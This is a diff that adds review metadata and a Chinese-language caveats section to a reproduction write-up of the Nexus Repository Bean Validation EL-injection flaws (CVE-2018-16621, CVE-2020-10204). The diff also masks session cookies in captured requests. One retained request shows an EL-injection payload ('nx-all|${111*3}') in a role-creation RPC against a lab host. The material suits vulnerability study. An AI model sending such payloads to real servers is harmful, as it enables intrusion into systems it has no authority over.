@@ -1,6 +1,43 @@
 ---
 cve: "CVE-2018-16621"
+product: "建议主归Nexus Repository，关联Java Bean Validation"
+record_type: "unknown"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: "CVE-2018-16621; CVE-2020-10204"
+referenced_identifiers: ""
+identifier_role: "primary"
+identifier_status: "unknown"
+title: "BeanValidation RCE 漏洞复现分析"
+prerequisites: "来源所述条件，未列明部分仍待核：前者3.x至3.13、后者3.x至3.21.1，缺精确固定点；实验3.13.0、需要管理员或相应用户/角色创建权限"
+side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
+source_status: "recorded"
+source_url: "https://mp.weixin.qq.com/s/eRuFvJ7xd7Phjiyz7N3avA"
+id: "vw-98ead81cc9c79a480fbf919c"
+entity_id: "ve-98ead81cc9c79a480fbf919c"
+schema_version: "1"
 ---
+
+## 核对与使用边界
+
+- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
+
+本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
+
+适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：前者3.x至3.13、后者3.x至3.21.1，缺精确固定点；实验3.13.0、需要管理员或相应用户/角色创建权限
+
+代码与实验材料：跟踪DirectJNgine/ConstraintValidator/EL，给roles和privileges两个算术payload；RCE只标题，没有命令链；调试图大量缺失
+
+来源证据范围：Sonatype官方安全文、先知与Knownsec分析，项目源码未钉到tag
+
+- **结论使用边界（1）**：实验公开JDWP与证明范围需标注；依据：docker把8000映射全部接口且开启远程调试；算术222/333证明EL执行，不等于已证明命令执行。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。
+
+- **结论使用边界（2）**：基础示例代码不一致；依据：ConstraintViolation&lt;Input&gt;却验证Customer；自定义注解未定义value()，实现却调用constraintAnnotation.value()；NotBlank仅至少一个字符遗漏非空白含义。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。
+
+- **适用与权限边界（3）**：产品与权限范围不能泛化；依据：问题为Nexus自定义消息插值拼接，不能称所有Bean Validation本身RCE；多处如下图后空白、固定session应占位。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。
+
+历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
 # BeanValidation RCE 漏洞复现分析
 
@@ -181,7 +218,7 @@ Origin: http://192.168.52.128:8081
 Referer: http://192.168.52.128:8081/  
 Accept-Encoding: gzip, deflate  
 Accept-Language: zh-CN,zh;q=0.9  
-Cookie: Hm_lvt_866c9be12d4a814454792b1fd0fed295=1641052730; Hm_lvt_df6f78cfc7b28956736ab98287309c75=1641052807; NXSESSIONID=3c62bb00-aef5-4390-8140-e211332f8eac  
+Cookie: Hm_lvt_866c9be12d4a814454792b1fd0fed295=1641052730; Hm_lvt_df6f78cfc7b28956736ab98287309c75=1641052807; NXSESSIONID=3c6******************************eac  
 Connection: close  
   
 {  
@@ -365,7 +402,7 @@ Origin: http://192.168.52.128:8081
 Referer: http://192.168.52.128:8081/  
 Accept-Encoding: gzip, deflate  
 Accept-Language: zh-CN,zh;q=0.9  
-Cookie: Hm_lvt_866c9be12d4a814454792b1fd0fed295=1641052730; Hm_lvt_df6f78cfc7b28956736ab98287309c75=1641052807; NXSESSIONID=f0facde6-ab42-45a5-a3de-db7ad822be61  
+Cookie: Hm_lvt_866c9be12d4a814454792b1fd0fed295=1641052730; Hm_lvt_df6f78cfc7b28956736ab98287309c75=1641052807; NXSESSIONID=f0f******************************e61  
 Connection: close  
   
 {"action":"coreui_Role","method":"create","data":[{"version":"","source":"default","id":"123","name":"123","description":"123","privileges":["nx-all|${111*3}"],"roles":["nx-admin"]}],"type":"rpc","tid":36}
